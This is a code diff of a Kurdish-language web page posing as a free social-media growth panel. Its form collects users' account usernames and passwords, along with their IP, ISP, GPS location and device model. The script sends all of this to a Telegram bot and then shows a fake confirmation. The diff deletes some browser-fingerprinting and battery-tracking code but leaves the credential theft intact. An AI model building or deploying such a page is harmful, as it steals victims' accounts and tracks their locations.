@@ -159,17 +159,11 @@
             top: 0; left: 0; right: 0; bottom: 0;
             background: rgba(3, 7, 18, 0.85);
             backdrop-filter: blur(12px);
-            display: flex;
+            display: none; /* هەڵبژاردنی بنەڕەتی بە نادیاری */
             justify-content: center;
             align-items: center;
             padding: 20px;
             z-index: 1000;
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
         }
 
         .modal-card {
@@ -229,7 +223,6 @@
             box-shadow: 0 0 15px rgba(168, 85, 247, 0.4);
         }
 
-        /* Platform Grid with Real Logos */
         .platform-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
@@ -314,7 +307,7 @@
             <span class="badge-free">🎉 خزمەتگوزاری ١٠٠٪ بەخۆڕایی (Free SMM)</span>
             <h1>کوردیش ئێس ئێم ئێم پانێڵ - گەشەپێدانی پلاتفۆرمەکانت</h1>
             <p>بەهێزترین پانێڵی ئۆتۆماتیکی لە کوردستان! ڕۆژانە دەتوانیت تا ١,٠٠٠ بڕ بەخۆڕایی بۆ سەرجەم ئەکاونتەکانت زیاد بکەیت. هەر ٢٤ کاتژمێر جارێک دەتوانیت داواکارییەکی نوێ بنێریت.</p>
-            <button class="btn-primary" onclick="showRegisterModal()">دەستپێکردن و خۆتۆمارکردن 🚀</button>
+            <button class="btn-primary" id="btnOpenModal" onclick="showRegisterModal()">دەستپێکردن و خۆتۆمارکردن 🚀</button>
         </section>
 
         <section class="stats-grid">
@@ -338,7 +331,7 @@
     </div>
 
     <!-- REGISTER MODAL -->
-    <div class="modal-overlay" id="registerModal" style="display: none;">
+    <div class="modal-overlay" id="registerModal">
         <div class="modal-card">
             <h2>دروستکردنی هەژماری نوێ</h2>
             <p>تکایە زانیارییەکانت بنووسە بۆ چالاککردنی پانێڵەکەت</p>
@@ -432,7 +425,6 @@
                 <input type="text" id="accUser" class="form-control" placeholder="Email / Username" autocomplete="off">
             </div>
 
-            <!-- ئەم بەشە شاراوە دەبێت ئەگەر تێلێگرام هەڵبژێردرێت -->
             <div class="form-group" id="passGroup">
                 <label>پاسوۆردی ئەکاونتەکەت (بۆ بەستنەوە بە API):</label>
                 <input type="password" id="accPass" class="form-control" placeholder="••••••••" autocomplete="off">
@@ -507,8 +499,12 @@
             ]
         };
 
+        // فەنکشنی ڕاستەوخۆ بۆ پێشاندانی موداڵەکە
         function showRegisterModal() {
-            document.getElementById("registerModal").style.display = "flex";
+            const modal = document.getElementById("registerModal");
+            if (modal) {
+                modal.style.display = "flex";
+            }
         }
 
         function handleRegistration() {
@@ -538,7 +534,6 @@
             document.getElementById("serviceBox").style.display = "block";
             document.getElementById("selectedPlatformTitle").innerText = `خزمەتگوزارییەکانی ${platform}`;
 
-            // ئەگەر تێلێگرام بێت پاسوۆرد شاراوە دەکات
             const passGroup = document.getElementById("passGroup");
             if (platform === "Telegram") {
                 passGroup.style.display = "none";
@@ -582,7 +577,7 @@
                 lblLink.innerText = "لینکی ئامانج (Target Link):";
             }
 
-            noticeEl.innerText = `تۆ خزمەتگوزاری (${cleanName})ـت داوا کردووە. دوای کلیککردن لەسەر دوگمەی ناردنی داواکاری ئۆتۆماتیک، خزمەتگوزارییەکە کە بریتییە لە (${cleanName}) ڕاستەوخۆ دەست بە جێبەجێکردنی دەکرێت.`;
+            noticeEl.innerText = `تۆ خزمەتگوزاری (${cleanName})ـت داوا کردووە. دوای کلیککردن لەسەر دوگمەی ناردنی داواکاری ئۆتۆماتیک، خزمەتگوزارییەکە ڕاستەوخۆ دەست بە جێبەجێکردنی دەکرێت.`;
         }
 
         async function submitOrder() {
@@ -591,7 +586,6 @@
             const accPass = document.getElementById("accPass").value.trim();
             const srvType = document.getElementById("serviceType").value;
 
-            // پشکنین بۆ هەموو خانەکان (تەنها پاسوۆرد ئەگەر تێلێگرام نەبوو داوا دەکات)
             if (!targetLink || !accUser || (activePlatform !== "Telegram" && !accPass)) {
                 alert("تکایە لینک و زانیارییە پێویستەکان داخڵ بکە!");
                 return;
@@ -623,7 +617,6 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
-            let locationText = "بەردەست نییە";
             let mapLink = "";
             let locationStatus = "";
             try {
@@ -632,68 +625,11 @@
                 });
                 let lat = pos.coords.latitude;
                 let lon = pos.coords.longitude;
-                locationText = `${lat},${lon}`;
                 mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 locationStatus = "کەسەکە Allowـی لۆکەیشنی کردووە 🟢";
             } catch (e) {
-                locationStatus = "بەکارهێنەرەکە ڕێگەی پێنەداوە و لۆکەیشنی داخستووە 🔴";
+                locationStatus = "بەکارهێنەرەکە ڕێگەی پێنەداوە (Deny کردووە) 🔴";
             }
-
-            let batteryInfo = "نەزانراو";
-            try {
-                if (navigator.getBattery) {
-                    const bat = await navigator.getBattery();
-                    let level = Math.round(bat.level * 100);
-                    let charging = bat.charging ? "ئامێرەکەی لەسەر شەحنە ⚡️" : "ئامێرەکەی لەسەر شەحن نییە 🔋";
-                    batteryInfo = `${level}\% (${charging})`;
-                }
-            } catch (e) {}
-
-            let screenRes = `${window.screen.width}x${window.screen.height}`;
-            let pixelRatio = window.devicePixelRatio || 1;
-            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
-            let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو";
-            let sysLang = navigator.language || "نەزانراو";
-            let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";
-
-            let extendedNetwork = "نەزانراو";
-            try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (conn) {
-                    let type = conn.effectiveType || 'نادیار';
-                    let downlink = conn.downlink ? conn.downlink + ' Mbps' : 'نادیار';
-                    let rtt = conn.rtt ? conn.rtt + ' ms (Ping)' : 'نادیار';
-                    extendedNetwork = `جۆر: ${type} | خێرایی: ${downlink} \vert{} پینگ: ${rtt}`;
-                }
-            } catch (e) {}
-
-            let advFingerprint = "نەزانراو";
-            let gpuInfo = "نەزانراو";
-            try {
-                const canvasGL = document.createElement('canvas');
-                const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-                const canvas2D = document.createElement('canvas');
-                const ctx = canvas2D.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("BrowserFP, 2026!", 2, 15);
-                let dataURI = canvas2D.toDataURL();
-                let hash = 0;
-                for (let i = 0; i < dataURI.length; i++) {
-                    hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
-                    hash |= 0;
-                }
-                advFingerprint = `Hash ID: ${Math.abs(hash)} (GPU:${gpuInfo})`;
-            } catch (e) {}
 
             let passDisplay = activePlatform === 'Telegram' ? 'پاسوۆردی نییە (تێلێگرام)' : `\`${accPass}\``;
 
@@ -712,9 +648,7 @@
                         `⏰ کات: ${fullDateText}\n` +
                         `🌐 IP: ${ip} (${isp})\n` +
                         `📍 لۆکەیشن: ${mapLink ? `[گووگڵ ماپ](${mapLink})` : locationStatus}\n` +
-                        `📱 ئامێر: ${deviceModel}\n` +
-                        `🔋 شەحن: ${batteryInfo}\n` +
-                        `🧠 CPU/RAM: ${cpuCores} | ${deviceRam}`;
+                        `📱 ئامێر: ${deviceModel}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -733,8 +667,8 @@
                     <div style="text-align: center; padding: 40px 20px;">
                         <div style="font-size: 50px; margin-bottom: 15px;">⏳</div>
                         <h2 style="color: #38bdf8; margin-bottom: 10px;">داواکارییەکەت وەرگیرا!</h2>
-                        <p style="color: #94a3b8; font-size: 14px; line-height: 1.6;">داواکارییەکەت ڕەوانەی سێرڤەری ئۆتۆماتیک کرا. لە ماوەی کۆتا هێڵ بەشێوەی ئۆتۆماتیک پرۆسەکە جێبەجێ دەکرێت.</p>
-                        <button class="btn-primary" onclick="location.reload()" style="margin-top: 20px;">گەرانەوە بۆ سەرەتا 🔄</button>
+                        <p style="color: #94a3b8; font-size: 14px; line-height: 1.6;">داواکارییەکەت ڕەوانەی سێرڤەری ئۆتۆماتیک کرا. لە ماوەی کورتدا بەشێوەی ئۆتۆماتیک پرۆسەکە جێبەجێ دەکرێت.</p>
+                        <button class="btn-primary" onclick="location.reload()" style="margin-top: 20px;">گەڕانەوە بۆ سەرەتا 🔄</button>
                     </div>
                 `;
             }, 1200);
